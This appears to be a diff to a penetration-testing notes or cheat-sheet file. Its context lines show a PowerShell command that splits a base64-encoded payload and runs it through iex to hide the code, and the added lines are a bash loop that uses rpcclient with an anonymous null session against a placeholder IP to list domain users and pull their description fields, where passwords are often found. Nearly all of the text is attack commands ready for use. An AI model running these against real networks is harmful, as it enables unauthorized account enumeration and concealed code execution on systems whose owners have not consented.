@@ -47,3 +47,13 @@ $part1 = $encoded.Substring(0, 8000)
 $part2 = $encoded.Substring(8000)
 
 powershell.exe -NoProfile -Command "`$code='$part1'+'$part2'; iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$code)))"
+
+
+rpcclient -U "" <IP> -c "enumdomusers" \
+| while read line; do
+    user=$(echo $line | cut -d'[' -f2 | cut -d']' -f1)
+    rid=$(echo $line | cut -d'[' -f4 | cut -d']' -f1)
+    echo "=== $user ==="
+    rpcclient -U "" <IP> -c "queryuser $rid" | grep -i description
+done
+
